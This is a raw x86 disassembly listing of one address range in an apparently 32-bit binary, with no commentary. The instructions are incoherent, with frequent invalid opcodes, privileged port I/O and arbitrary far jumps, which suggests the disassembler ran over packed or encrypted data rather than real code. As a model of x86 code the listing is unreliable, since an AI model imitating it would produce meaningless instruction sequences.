  40d265:	(bad)  
  40d266:	test   eax,0x26fe76ed
  40d26b:	mul    BYTE PTR [ecx-0x19]
  40d26e:	repz cmp DWORD PTR [ebx+0x5eadc6f],eax
  40d275:	out    0x23,al
  40d277:	popf   
  40d278:	or     eax,0xf87d751d
  40d27d:	xor    BYTE PTR [ebx+ebp*4],0x91
  40d281:	mov    cl,0x6b
  40d283:	dec    ebx
  40d284:	add    ebx,DWORD PTR [eax+0x58]
  40d287:	xchg   ebx,eax
  40d288:	out    0xaa,al
  40d28a:	or     al,0xa7
  40d28c:	in     eax,dx
  40d28d:	xchg   DWORD PTR [eax],ecx
  40d28f:	mov    cl,0x2
  40d291:	xchg   esi,eax
  40d292:	fild   DWORD PTR fs:[eax]
  40d295:	test   DWORD PTR [esi-0x25],esi
  40d298:	gs cmp al,0x15
  40d29b:	repnz scas al,BYTE PTR es:[edi]
  40d29d:	(bad)  [esi]
  40d29f:	sti    
  40d2a0:	inc    edx
  40d2a1:	xchg   ecx,eax
  40d2a2:	js     0x40d2c1
  40d2a4:	push   edi
  40d2a5:	push   eax
  40d2a6:	ds adc eax,0x7033cfaa
  40d2ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2ad:	jbe    0x40d28c
  40d2af:	sub    al,BYTE PTR [edx+ebx*4-0x3f]
  40d2b3:	les    eax,FWORD PTR [ebp-0x75]
  40d2b6:	mov    esi,0xf1e3d65f
  40d2bb:	icebp  
  40d2bc:	xor    eax,0x2bec0602
  40d2c1:	sub    al,0x38
  40d2c3:	out    dx,al
  40d2c4:	push   esi
  40d2c5:	pop    es
  40d2c6:	inc    edi
  40d2c7:	ins    DWORD PTR es:[edi],dx
  40d2c8:	pop    edx
  40d2c9:	popf   
  40d2ca:	or     DWORD PTR [ecx+0x26],0xffffffab
  40d2ce:	cdq    
  40d2cf:	inc    ecx
  40d2d0:	xchg   ebp,eax
  40d2d1:	push   edx
  40d2d2:	mov    bl,0x91
  40d2d4:	jmp    0x72ce:0xa34de0fd
  40d2db:	and    eax,0xe5a45dc1
  40d2e0:	dec    ecx
  40d2e1:	lahf   
  40d2e2:	fcmovbe st,st(0)
  40d2e4:	or     DWORD PTR [edx+0x1ddba55d],eax
  40d2ea:	mov    edi,0xe1980ff0
  40d2ef:	cmp    eax,0xa78058b4
  40d2f4:	mov    bl,0x6d
  40d2f6:	push   ebx
  40d2f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2f8:	dec    ebx
  40d2f9:	loope  0x40d2c7
  40d2fb:	enter  0xa9fb,0xa8
  40d2ff:	jge    0x40d29d
  40d301:	iret   
  40d302:	gs dec esi
  40d304:	inc    ecx
  40d305:	fild   WORD PTR [eax]
  40d307:	add    al,0x8d
  40d309:	scas   al,BYTE PTR es:[edi]
  40d30a:	sbb    ah,bh
  40d30c:	aad    0xb1
  40d30e:	sahf   
  40d30f:	push   edi
  40d310:	nop
  40d311:	mov    ds:0x8fa2a679,al
  40d316:	rcr    DWORD PTR [edx],0x37
  40d319:	pusha  
  40d31a:	adc    al,0x6b
  40d31c:	xchg   edx,eax
  40d31d:	or     esp,DWORD PTR [eax]
  40d31f:	pop    ecx
  40d320:	(bad)  
  40d321:	cs ficom DWORD PTR fs:[eax-0x26bf6ba9]
  40d329:	outs   dx,BYTE PTR ds:[esi]
  40d32a:	jb     0x40d305
  40d32c:	push   ebx
  40d32d:	xlat   BYTE PTR ds:[ebx]
  40d32e:	fidivr WORD PTR [ecx+0x24]
  40d331:	jle    0x40d359
  40d333:	adc    cl,bh
  40d335:	cmp    eax,0xde852fc9
  40d33a:	pop    edi
  40d33b:	out    0xd9,al
  40d33d:	sbb    dl,BYTE PTR [edi]
  40d33f:	mov    bh,0x9b
  40d341:	xor    edx,DWORD PTR [edx-0x20]
  40d344:	push   edx
  40d345:	stos   DWORD PTR es:[edi],eax
  40d346:	(bad)  
  40d348:	push   eax
  40d349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d34a:	jmp    0xc33ed26e
  40d34f:	xchg   BYTE PTR [eax],ch
  40d351:	aad    0xa1
  40d353:	ja     0x40d32b
  40d355:	mov    ebp,0x752fdd76
  40d35a:	xor    BYTE PTR [eax+0x29],bh
  40d35d:	or     DWORD PTR [eax+0x55],edx
  40d360:	push   ss
  40d361:	fsubr  QWORD PTR [eax]
  40d363:	sub    DWORD PTR [ecx-0x68],edi
  40d366:	or     cl,al
  40d368:	mov    dh,0x30
  40d36a:	sbb    BYTE PTR [ebp+0x13],dh
  40d36d:	fbstp  TBYTE PTR [ebx]
  40d36f:	into   
  40d370:	ins    BYTE PTR es:[edi],dx
  40d371:	shl    bh,0x2e
  40d374:	fwait
  40d375:	adc    BYTE PTR [edi-0x5ebf1d2a],cl
  40d37b:	push   0x1d584844
  40d380:	inc    esp
  40d381:	pusha  
  40d382:	xor    ecx,DWORD PTR [edi]
  40d384:	icebp  
  40d385:	or     bh,BYTE PTR [eax+0x8]
  40d388:	rol    BYTE PTR [esi+0x4d4e189],cl
  40d38e:	or     esi,esp
  40d390:	mov    ebx,ecx
  40d392:	cdq    
  40d393:	jg     0x40d352
  40d395:	out    0xcf,al
  40d397:	push   cs
  40d398:	sbb    esp,DWORD PTR [ecx+0x7]
  40d39b:	loope  0x40d408
  40d39d:	mov    BYTE PTR [esi+0x66fa5696],cl
  40d3a3:	mov    esp,0x2e8a4759
  40d3a8:	xor    ebp,DWORD PTR [eax-0x4e]
  40d3ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3ac:	aaa    
  40d3ad:	(bad)  
  40d3ae:	call   FWORD PTR [ebx-0x6]
  40d3b1:	nop
  40d3b2:	outs   dx,BYTE PTR cs:[esi]
  40d3b4:	in     eax,0x2f
  40d3b6:	add    DWORD PTR [edx-0x7c8d5481],esp
  40d3bc:	mov    al,0x21
  40d3be:	ja     0x40d374
  40d3c0:	fcmovnbe st,st(3)
  40d3c2:	daa    
  40d3c3:	adc    esi,DWORD PTR [eax]
  40d3c5:	inc    esp
  40d3c6:	push   esp
  40d3c7:	dec    esi
  40d3c8:	out    0x30,al
  40d3ca:	mov    esp,ebp
  40d3cc:	rol    DWORD PTR [esi+0x0],1
  40d3cf:	sub    al,0xef
  40d3d1:	int    0xb9
  40d3d3:	push   es
  40d3d4:	and    eax,0x2acb7a4b
  40d3d9:	push   eax
  40d3da:	pop    ss
  40d3db:	add    BYTE PTR [eax],bl
  40d3dd:	and    ecx,esp
  40d3df:	js     0x40d362
  40d3e1:	inc    ebp
  40d3e2:	push   cs
  40d3e3:	inc    edx
  40d3e4:	out    dx,al
  40d3e5:	loope  0x40d394
  40d3e7:	push   0x6b9cf350
  40d3ec:	add    DWORD PTR ds:0x30dcb291,edx
  40d3f2:	mov    ebx,edi
  40d3f4:	cmp    eax,0x92f4483e
  40d3f9:	adc    cl,BYTE PTR ds:0x9abf4aeb
  40d3ff:	sub    ebx,DWORD PTR [edx-0x60]
  40d402:	mov    cl,0x19
  40d404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d405:	in     eax,dx
  40d406:	fimul  DWORD PTR [edi+0x5859738e]
  40d40c:	pop    eax
  40d40d:	and    eax,0xf2302383
  40d412:	push   ebp
  40d413:	mov    DWORD PTR [ebx],edx
  40d415:	inc    ecx
  40d416:	js     0x40d40c
  40d418:	push   ecx
  40d419:	mul    DWORD PTR [edi+0x4d6cbb07]
  40d41f:	pop    ecx
  40d420:	jae    0x40d43f
  40d422:	jg     0x40d425
  40d424:	pop    ebp
  40d425:	and    eax,0x22a33bb0
  40d42a:	cs inc esp
  40d42c:	jbe    0x40d3bb
  40d42e:	push   eax
  40d42f:	adc    bl,BYTE PTR [ecx+esi*2-0x4c]
  40d433:	mov    eax,0x63db0b7a
  40d438:	retf   0x2c28
  40d43b:	enter  0xe990,0x19
  40d43f:	add    DWORD PTR ds:0x4184a058,esp
  40d445:	test   eax,0x1095a4a4
  40d44a:	inc    edi
  40d44b:	retf   
  40d44c:	add    al,0x55
  40d44e:	dec    ebp
  40d44f:	retf   0x6bb5
  40d452:	test   al,0x27
  40d454:	ficomp DWORD PTR [eax+0x61]
  40d457:	out    dx,eax
  40d458:	test   eax,0x631ca5e1
  40d45d:	imul   ebx,DWORD PTR [eax+0xccee6ce],0x55ccbae
  40d467:	in     al,dx
  40d468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d469:	rcl    DWORD PTR [ebx+0x3d],0xec
  40d46d:	cli    
  40d46e:	imul   edi,DWORD PTR [edx+0x6df6d16f],0x5d
  40d475:	or     eax,0xfdb979f0
  40d47a:	inc    ebx
  40d47b:	sub    al,0x8a
  40d47d:	out    0x57,al
  40d47f:	mov    edi,0xdddcebca
  40d484:	inc    esi
  40d485:	adc    eax,0x5929157c
  40d48a:	add    eax,DWORD PTR [ebp-0x1143467]
  40d490:	fwait
  40d491:	push   ds
  40d492:	add    DWORD PTR [ebx+0x7d],edi
  40d495:	inc    esp
  40d496:	xchg   edx,eax
  40d497:	mov    esp,0x497bd364
  40d49c:	adc    bh,al
  40d49e:	and    BYTE PTR [eax+0x51ac9a8b],ah
  40d4a4:	leave  
  40d4a5:	(bad)  
  40d4a6:	push   cs
  40d4a7:	stos   BYTE PTR es:[edi],al
  40d4a8:	jno    0x40d4e4
  40d4aa:	popa   
  40d4ab:	mov    DWORD PTR [edi+0x2c52c366],0xf5b0a52f
  40d4b5:	les    eax,FWORD PTR [ebp-0x2450f42d]
  40d4bb:	fiadd  WORD PTR [edi-0x44]
  40d4be:	ror    DWORD PTR [esi+0x16],cl
  40d4c1:	or     DWORD PTR gs:[ebx],edx
  40d4c4:	(bad)  
  40d4c5:	stc    
  40d4c6:	lahf   
  40d4c7:	xchg   ecx,eax
  40d4c8:	push   esi
  40d4c9:	fcom   DWORD PTR [ebx+0x79b350e6]
  40d4cf:	fs je  0x40d536
  40d4d2:	fld    DWORD PTR [ebx+eiz*8-0x662c82b]
  40d4d9:	mov    BYTE PTR [esi-0x3698a304],ah
  40d4df:	and    bl,dh
  40d4e1:	sahf   
  40d4e2:	loop   0x40d552
  40d4e4:	adc    al,0xd9
  40d4e6:	(bad)  
  40d4e7:	dec    esp
  40d4e8:	add    DWORD PTR [ebp-0x7184d3f],edx
  40d4ee:	in     al,0x5a
  40d4f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4f1:	mov    ch,0x5
  40d4f3:	mov    esi,0x9a4a660f
  40d4f8:	jno    0x40d531
  40d4fa:	in     al,dx
  40d4fb:	mov    dh,0x70
  40d4fd:	retf   0xa29f
  40d500:	sbb    esi,edx
  40d502:	add    edx,DWORD PTR [ebx+esi*4-0x5c]
  40d506:	stc    
  40d507:	jo     0x40d583
  40d509:	dec    ecx
  40d50a:	push   cs
  40d50b:	iret   
  40d50c:	fld    st(5)
  40d50e:	in     al,dx
  40d50f:	das    
  40d510:	int3   
  40d511:	jp     0x40d4dc
  40d513:	mov    ch,0x5c
  40d515:	aaa    
  40d516:	(bad)  
  40d517:	cmp    bh,BYTE PTR [edx+0x7d8c65d0]
  40d51d:	or     al,0x89
  40d51f:	or     BYTE PTR [ebx],dh
  40d521:	sti    
  40d522:	retf   0x403f
  40d525:	int3   
  40d526:	clc    
  40d527:	cmp    eax,0x16e6c6d4
  40d52c:	xchg   DWORD PTR [edi-0x61eb37f5],ecx
  40d532:	pop    ss
  40d533:	pushf  
  40d534:	test   BYTE PTR [edx],dh
  40d536:	push   es
  40d537:	inc    esi
  40d538:	fucomi st,st(2)
  40d53a:	push   esi
  40d53b:	adc    eax,DWORD PTR [ebp+0x77]
  40d53e:	xchg   ebp,eax
  40d53f:	aam    0x46
  40d541:	scas   al,BYTE PTR es:[edi]
  40d542:	inc    ax
  40d544:	push   es
  40d545:	popa   
  40d546:	cld    
  40d547:	lds    esp,FWORD PTR [edx-0x21]
  40d54a:	jp     0x40d567
  40d54c:	pop    es
  40d54d:	cwde   
  40d54e:	xchg   DWORD PTR [ebx+0x53963a5d],ecx
  40d554:	aas    
  40d555:	fisubr WORD PTR [edi]
  40d557:	pop    ebx
  40d558:	or     al,0xe9
  40d55a:	lock sbb eax,0xa1c7468c
  40d560:	pop    edx
  40d561:	sbb    esi,eax
  40d563:	sub    BYTE PTR [esi+0x1b03fb47],ch
  40d569:	pop    esi
  40d56a:	or     al,0xb2
  40d56c:	fbld   TBYTE PTR [ecx+0x13afadf4]
  40d572:	xor    eax,0xc1cb7194
  40d577:	fist   DWORD PTR [edi+0x74eda81a]
  40d57d:	or     ebx,DWORD PTR [esi]
  40d57f:	pop    edx
  40d580:	adc    DWORD PTR [eax*1-0x11473d75],ebp
  40d587:	or     cl,dl
  40d589:	mov    ds,WORD PTR [edi]
  40d58b:	call   0x9029258c
  40d590:	sub    bh,BYTE PTR [edx-0x19]
  40d593:	(bad)  
  40d595:	das    
  40d596:	pop    ebp
  40d597:	xchg   DWORD PTR [eax],ebx
  40d599:	jo     0x40d618
  40d59b:	mov    eax,ds:0x690b4b12
  40d5a0:	jmp    DWORD PTR [edi+0x4d]
  40d5a3:	cdq    
  40d5a4:	fdivr  DWORD PTR [ebp-0x64]
  40d5a7:	jbe    0x40d609
  40d5a9:	ret    0x33c0
  40d5ac:	clc    
  40d5ad:	outs   dx,DWORD PTR ds:[esi]
  40d5ae:	sub    eax,0x25c044a1
  40d5b3:	inc    edi
  40d5b4:	repnz mov al,0x35
  40d5b7:	or     BYTE PTR [eax],bh
  40d5b9:	call   0xdebe3f60
  40d5be:	dec    esi
  40d5bf:	call   0xfcd738c7
  40d5c4:	lock mov eax,0xa347dbe5
  40d5ca:	test   eax,0x1f2c2b03
  40d5cf:	ret    0x3264
  40d5d2:	pusha  
  40d5d3:	push   es
  40d5d4:	inc    ecx
  40d5d5:	stos   BYTE PTR es:[edi],al
  40d5d6:	and    ebx,edx
  40d5d8:	or     ebx,DWORD PTR [ebx]
  40d5da:	mov    cl,0x8f
  40d5dc:	or     bh,ah
  40d5de:	outs   dx,DWORD PTR ds:[esi]
  40d5df:	push   ebp
  40d5e0:	sub    dl,0x8
  40d5e3:	or     al,0xb9
  40d5e5:	jb     0x40d5cd
  40d5e7:	push   0xffffff92
  40d5e9:	and    eax,0xcb9d82a4
  40d5ee:	fdiv   st(6),st
  40d5f0:	inc    ecx
  40d5f1:	mov    edx,0x1d879c65
  40d5f6:	jne    0x40d63e
  40d5f8:	add    BYTE PTR [esi+0x54743811],dh
  40d5fe:	mov    dh,0xbd
  40d600:	cs int 0xdd
  40d603:	adc    eax,0xa0f04fb
  40d608:	cmp    al,0x36
  40d60a:	(bad)  
  40d60b:	xor    dl,BYTE PTR ss:[edi-0x3a]
  40d60f:	mov    ?,ebx
  40d611:	and    ah,BYTE PTR [ebp+0x1be21405]
  40d617:	std    
  40d618:	mov    ah,0x6f
  40d61a:	mov    ds:0x1b9641b2,eax
  40d61f:	pop    esp
  40d620:	ret    
  40d621:	push   ebp
  40d622:	mov    al,0x8
  40d624:	jle    0x40d661
  40d626:	ja     0x40d5d2
  40d628:	fst    st(1)
  40d62a:	push   es
  40d62b:	je     0x40d61b
  40d62d:	sbb    BYTE PTR [edx+0x5d8c2623],dl
  40d633:	pop    ecx
  40d634:	xchg   esi,eax
  40d635:	jns    0x40d648
  40d637:	xor    esi,edx
  40d639:	hlt    
  40d63a:	push   cs
  40d63b:	into   
  40d63c:	xchg   edi,eax
  40d63d:	adc    ecx,DWORD PTR [esi+0x43a72364]
  40d643:	xchg   ebp,eax
  40d644:	cmp    DWORD PTR [esi],ecx
  40d646:	adc    bh,BYTE PTR [esi+0x243f0b9a]
  40d64c:	dec    esp
  40d64d:	mov    ch,0x19
  40d64f:	ficomp DWORD PTR [ecx]
  40d651:	ret    
  40d652:	sbb    DWORD PTR [eax],ebp
  40d654:	adc    edi,DWORD PTR [eax]
  40d656:	out    dx,al
  40d657:	mov    bh,0x41
  40d659:	sar    dl,0xcb
  40d65c:	jnp    0x40d63d
  40d65e:	fild   WORD PTR [edx+0x1]
  40d661:	xchg   esp,eax
  40d662:	lock enter 0xf2ca,0x25
  40d667:	push   edx
  40d668:	adc    ecx,ecx
  40d66a:	adc    eax,0xbe79cb34
  40d66f:	xlat   BYTE PTR ds:[ebx]
  40d670:	xchg   esi,eax
  40d671:	pop    edx
  40d672:	int    0x60
  40d674:	xor    ah,al
  40d676:	out    0x84,eax
  40d678:	aad    0xa9
  40d67a:	out    0xfe,eax
  40d67c:	xor    cl,BYTE PTR [esi+0x6a7e5305]
  40d682:	stos   DWORD PTR es:[edi],eax
  40d683:	xor    al,0xd9
  40d685:	cdq    
  40d686:	jmp    0x40d618
  40d688:	fwait
  40d689:	aam    0x77
  40d68b:	push   ecx
  40d68c:	pop    ds
  40d68d:	pop    ds
  40d68e:	inc    edx
  40d68f:	test   BYTE PTR [ebx],bl
  40d691:	sti    
  40d692:	mov    bh,BYTE PTR [ecx-0x4d9ea31e]
  40d698:	outs   dx,DWORD PTR ds:[esi]
  40d699:	adc    dl,BYTE PTR [ecx-0xc471fc8]
  40d69f:	shl    DWORD PTR [ecx+0x6ca74f28],cl
  40d6a5:	hlt    
  40d6a6:	out    dx,eax
  40d6a7:	add    ch,cl
  40d6a9:	add    ah,dh
  40d6ab:	fcomip st,st(4)
  40d6ad:	jno    0x40d715
  40d6af:	or     eax,0x952e705f
  40d6b4:	jmp    0x90a8dec5
  40d6b9:	xor    cl,BYTE PTR [edi]
  40d6bb:	dec    esp
  40d6bc:	xchg   DWORD PTR [edx-0x7e],ebp
  40d6bf:	out    0xe9,eax
  40d6c1:	test   BYTE PTR [esi-0x9],dh
  40d6c4:	inc    ecx
  40d6c5:	sub    cl,0xdf
  40d6c8:	push   ecx
  40d6c9:	int3   
  40d6ca:	push   cs
  40d6cb:	data16 mov dh,0x34
  40d6ce:	or     al,0x91
  40d6d0:	sbb    BYTE PTR [ebx+0x11],0x7a
  40d6d4:	in     al,dx
  40d6d5:	jmp    0x1618882e
  40d6da:	icebp  
  40d6db:	out    0x54,eax
  40d6dd:	ffree  st(3)
  40d6df:	lds    edi,FWORD PTR ds:0xb2c36253
  40d6e5:	mov    gs,WORD PTR [eax]
  40d6e7:	pop    ss
  40d6e8:	pop    esi
  40d6e9:	seta   BYTE PTR [eax-0x3e26484]
  40d6f0:	inc    edx
  40d6f1:	pushf  
  40d6f2:	pushf  
  40d6f3:	add    eax,0x24364657
  40d6f8:	mov    cl,0x76
  40d6fa:	pusha  
  40d6fb:	popf   
  40d6fc:	mov    bh,0xf0
  40d6fe:	cmp    dh,ch
  40d700:	outs   dx,DWORD PTR ds:[esi]
  40d701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d702:	std    
  40d703:	stc    
  40d704:	aad    0x4c
  40d706:	jp     0x40d6ee
  40d708:	adc    al,BYTE PTR [edi+0x5f]
  40d70b:	hlt    
  40d70c:	and    al,0x93
  40d70e:	fwait
  40d70f:	pop    ebx
  40d710:	aaa    
  40d711:	aad    0x49
  40d713:	rcr    BYTE PTR [esi-0x72],1
  40d716:	inc    edi
  40d717:	addr16 das 
  40d719:	pop    edx
  40d71a:	js     0x40d72a
  40d71c:	inc    ebx
  40d71d:	mov    al,BYTE PTR [ecx+0xb]
  40d720:	pop    esp
  40d721:	or     eax,0x5c9eff57
  40d726:	pop    ss
  40d727:	cmp    BYTE PTR [ebp-0xfa0bd8a],al
  40d72d:	push   eax
  40d72e:	push   ds
  40d72f:	repz int 0x68
  40d732:	repnz sbb ebp,DWORD PTR [edi+0x27]
  40d736:	imul   DWORD PTR [edx-0x3]
  40d739:	inc    ebp
  40d73a:	frstor [esi-0x2b]
  40d73d:	loopne 0x40d78d
  40d73f:	test   DWORD PTR [esi],eax
  40d741:	and    edi,DWORD PTR [edx]
  40d743:	sbb    al,0x99
  40d745:	add    al,0x14
  40d747:	retw   
  40d749:	mov    ds:0xb24e0549,al
  40d74e:	aam    0x32
  40d750:	sub    al,bh
  40d752:	or     ebp,DWORD PTR es:[ebp+0x56b58ba]
  40d759:	repnz cs loope 0x40d6fb
  40d75d:	cmp    ebx,DWORD PTR [edi+edx*2+0x1d]
  40d761:	sub    bl,BYTE PTR [edx]
  40d763:	lock mov ebx,0x74e68efb
  40d769:	xor    edx,DWORD PTR [eax]
  40d76b:	push   cs
  40d76c:	ins    DWORD PTR es:[edi],dx
  40d76d:	das    
  40d76e:	shr    DWORD PTR [edx],cl
  40d770:	sti    
  40d771:	mov    bh,0xed
  40d773:	in     al,dx
  40d774:	adc    al,BYTE PTR [edx-0x35]
  40d777:	inc    esp
  40d778:	pop    esp
  40d779:	inc    ecx
  40d77a:	xor    BYTE PTR [ecx-0x44],0xdc
  40d77e:	jne    0x40d71a
  40d780:	mov    ebp,0x9b53859f
  40d785:	lahf   
  40d786:	adc    al,0x49
  40d788:	pop    ss
  40d789:	call   0x24d:0x8ad9a7db
  40d790:	xor    eax,0xd63b260d
  40d795:	mov    esp,0x52bba3ae
  40d79a:	xchg   BYTE PTR [ebp-0x4d],ah
  40d79d:	jns    0x40d819
  40d79f:	inc    ebx
  40d7a0:	and    al,0x62
  40d7a2:	jnp    0x40d7ec
  40d7a4:	in     eax,dx
  40d7a5:	pop    esi
  40d7a6:	xor    al,0xec
  40d7a8:	push   ebp
  40d7a9:	enter  0x334d,0xaa
  40d7ad:	fdivr  QWORD PTR [edi+0x5a]
  40d7b0:	jo     0x40d794
  40d7b2:	outs   dx,BYTE PTR ds:[esi]
  40d7b3:	jo     0x40d74e
  40d7b5:	jne    0x40d7f2
  40d7b7:	and    eax,0x63c7978c
  40d7bc:	std    
  40d7bd:	jge    0x40d7df
  40d7bf:	xchg   ebp,ebx
  40d7c1:	aam    0x81
  40d7c3:	mov    esp,0x250b7c0c
  40d7c8:	pop    esp
  40d7c9:	fimul  DWORD PTR [ebp+0xe591316]
  40d7cf:	and    dl,al
  40d7d1:	adc    ah,BYTE PTR ds:0x412a4534
  40d7d7:	(bad)  
  40d7d8:	adc    bh,ah
  40d7da:	xor    edi,DWORD PTR [esi+0x2466761d]
  40d7e0:	jnp    0x40d781
  40d7e2:	leave  
  40d7e3:	cmc    
  40d7e4:	rol    BYTE PTR [eax],0xa4
  40d7e7:	jle    0x40d85f
  40d7e9:	icebp  
  40d7ea:	cmp    al,0xbe
  40d7ec:	(bad)  
  40d7ed:	cld    
  40d7ee:	push   esp
  40d7ef:	jnp    0x40d778
  40d7f1:	sar    DWORD PTR [ebp+0x5a],cl
  40d7f4:	mov    al,0xfd
  40d7f6:	jmp    0x7adc:0xdbee4539
  40d7fd:	push   0x234940f7
  40d802:	push   edx
  40d803:	cld    
  40d804:	ret    
  40d805:	fwait
  40d806:	mov    al,0xba
  40d808:	inc    eax
  40d809:	(bad)  
  40d80a:	lods   al,BYTE PTR ds:[esi]
  40d80b:	cmp    DWORD PTR [edi+0x5f],eax
  40d80e:	sbb    BYTE PTR [eax],dh
  40d810:	clc    
  40d811:	adc    eax,0x662fe2b7
  40d816:	dec    ecx
  40d817:	cmp    eax,0x4d56c1fc
  40d81c:	lods   al,BYTE PTR ds:[esi]
  40d81d:	mov    al,bl
  40d81f:	aas    
  40d820:	rcr    WORD PTR [edx-0x25f38cf2],0x4e
  40d828:	aaa    
  40d829:	out    0xae,eax
  40d82b:	cmp    al,0xb4
  40d82d:	sahf   
  40d82e:	daa    
  40d82f:	sub    al,0x36
  40d831:	lods   al,BYTE PTR ds:[esi]
  40d832:	adc    eax,0xbb7055f7
  40d837:	call   0x412d9d28
  40d83c:	jmp    0x8dd9db04
  40d841:	(bad)  
  40d842:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d843:	sub    ebp,DWORD PTR [edi-0x15c7024e]
  40d849:	(bad)  
  40d84a:	push   es
  40d84b:	ins    DWORD PTR es:[edi],dx
  40d84c:	retf   0x2078
  40d84f:	lds    edi,FWORD PTR [eax-0xc230682]
  40d855:	xor    edi,esp
  40d857:	lahf   
  40d858:	adc    al,0x32
  40d85a:	inc    esp
  40d85b:	repnz adc al,0x15
  40d85e:	push   0x1e
  40d860:	and    eax,0x46a462ea
  40d865:	or     al,0x48
  40d867:	cmp    ch,BYTE PTR [esi+eiz*8-0x4acfb537]
  40d86e:	loop   0x40d82c
  40d870:	or     DWORD PTR [edx+0x52],eax
  40d873:	and    DWORD PTR [ebx],0x4619f1e0
  40d879:	stc    
  40d87a:	xor    BYTE PTR [eax+0x24],ch
  40d87d:	pop    ebx
  40d87e:	daa    
  40d87f:	and    eax,0x9a370904
  40d884:	xlat   BYTE PTR ds:[ebx]
  40d885:	inc    ebx
  40d886:	lea    esi,[ebx-0x29b60502]
  40d88c:	dec    ebx
  40d88d:	leave  
  40d88e:	mov    ah,0x8b
  40d890:	int3   
  40d891:	jo     0x40d8c4
  40d893:	mov    bl,0x21
  40d895:	push   esp
  40d896:	jge    0x40d818
  40d898:	push   0xffffffdc
  40d89a:	inc    esp
  40d89b:	test   al,0x2f
  40d89d:	inc    esi
  40d89e:	sbb    al,0x27
  40d8a0:	push   0x12d872f2
  40d8a5:	les    eax,FWORD PTR [edx-0x405b4a4b]
  40d8ab:	push   edi
  40d8ac:	fldenv [eax+ecx*4]
  40d8af:	cdq    
  40d8b0:	ret    0xb398
  40d8b3:	daa    
  40d8b4:	in     al,dx
  40d8b5:	mov    dh,BYTE PTR [ecx+0x4a16bf41]
  40d8bb:	xchg   ebx,eax
  40d8bc:	lods   al,BYTE PTR ds:[esi]
  40d8bd:	loopne 0x40d8f9
  40d8bf:	call   0x84f5:0xfbab768c
  40d8c6:	mov    ebp,0xed59b712
  40d8cb:	cmc    
  40d8cc:	jmp    0x40d858
  40d8ce:	fimul  WORD PTR [ebx]
  40d8d0:	mov    edi,0x460bce58
  40d8d5:	ins    DWORD PTR es:[edi],dx
  40d8d6:	inc    ecx
  40d8d7:	cs stos DWORD PTR es:[edi],eax
  40d8d9:	push   ecx
  40d8da:	out    dx,al
  40d8db:	dec    BYTE PTR [edx+0x1c232992]
  40d8e1:	(bad)  
  40d8e3:	loop   0x40d910
  40d8e5:	mov    al,0x3a
  40d8e7:	mov    bl,0xf9
  40d8e9:	test   dh,dh
  40d8eb:	cdq    
  40d8ec:	mov    cl,0x78
  40d8ee:	pop    ebp
  40d8ef:	mov    ds:0x66f57ac1,al
  40d8f4:	shl    dh,cl
  40d8f6:	mov    bh,0xb6
  40d8f8:	bound  esp,QWORD PTR ds:0x62fcc72
  40d8fe:	add    DWORD PTR [edi-0x27],esp
  40d901:	enter  0x5569,0xe3
  40d905:	imul   ecx,DWORD PTR [ebx],0xffffffa8
  40d908:	pop    ecx
  40d909:	je     0x40d970
  40d90b:	je     0x40d92d
  40d90d:	xchg   esi,eax
  40d90e:	aam    0x0
  40d910:	cwde   
  40d911:	frstor [eax-0x7e632872]
  40d917:	call   FWORD PTR [eax+edi*1-0x6d]
  40d91b:	mov    ecx,0x39da1301
  40d920:	repz mov eax,ds:0xf17fcb89
  40d926:	mov    al,0x84
  40d928:	jmp    0x40d8f5
  40d92a:	or     BYTE PTR [ebp+0x15],dh
  40d92d:	fwait
  40d92e:	loopne 0x40d8ee
  40d930:	mov    ds:0xa3949968,al
  40d936:	mov    ebx,0x9e6c2d76
  40d93b:	fistp  DWORD PTR [edx+0x24]
  40d93e:	jns    0x40d9b2
  40d940:	pop    ecx
  40d941:	ret    
  40d942:	jo     0x40d8f3
  40d944:	and    al,0x31
  40d946:	clc    
  40d947:	adc    BYTE PTR [ebx-0x5869663c],ch
  40d94d:	add    eax,esi
  40d94f:	mov    bl,0x4a
  40d951:	or     BYTE PTR [edi-0x54fa15f3],dl
  40d957:	js     0x40d8f0
  40d959:	push   edx
  40d95a:	inc    ecx
  40d95b:	mov    edx,DWORD PTR [edi+0x5a239c5b]
  40d961:	fs stos BYTE PTR es:[edi],al
  40d963:	or     dl,BYTE PTR [ebp-0x3e0dcc4d]
  40d969:	push   0x12321b31
  40d96e:	xor    dh,bh
  40d970:	mov    ds:0x18fa9de3,al
  40d975:	cs addr16 cld 
  40d978:	push   eax
  40d979:	or     bh,BYTE PTR [ecx-0x206fcbd3]
  40d97f:	and    DWORD PTR [ecx+0x759d5934],esi
  40d985:	pop    edi
  40d986:	lahf   
  40d987:	cs push edx
  40d989:	scas   al,BYTE PTR es:[edi]
  40d98a:	clc    
  40d98b:	jbe    0x40da0b
  40d98d:	adc    edi,DWORD PTR [ecx+0xa14c6aa]
  40d993:	and    edx,DWORD PTR ds:0xd703f2fb
  40d999:	and    BYTE PTR [edi],dl
  40d99b:	sbb    esp,DWORD PTR [edx]
  40d99d:	lea    eax,[ecx-0x64]
  40d9a0:	out    dx,eax
  40d9a1:	cmp    eax,0x3b94ab16
  40d9a6:	dec    esi
  40d9a7:	sbb    bh,BYTE PTR [ecx]
  40d9a9:	aaa    
  40d9aa:	imul   eax,DWORD PTR [edx+0x6c287a8c],0x3053d498
  40d9b4:	aaa    
  40d9b5:	dec    edi
  40d9b6:	inc    esp
  40d9b7:	mov    ds:0xe4f384cc,al
  40d9bc:	mov    ch,0x7d
  40d9be:	arpl   WORD PTR [esi+edx*2-0x4b],di
  40d9c2:	in     eax,dx
  40d9c3:	lods   al,BYTE PTR es:[esi]
  40d9c5:	xchg   dl,bh
  40d9c7:	addr16 (bad) 
  40d9ca:	xor    BYTE PTR [esi+eiz*1-0x74],dh
  40d9ce:	xor    eax,0xeff23fb9
  40d9d3:	sbb    ch,BYTE PTR [edx+0x5edb5d7e]
  40d9d9:	xchg   esi,eax
  40d9da:	push   ds
  40d9db:	fcomp  DWORD PTR [ecx]
  40d9dd:	xchg   ebx,eax
  40d9de:	mov    esp,0xb5074bd2
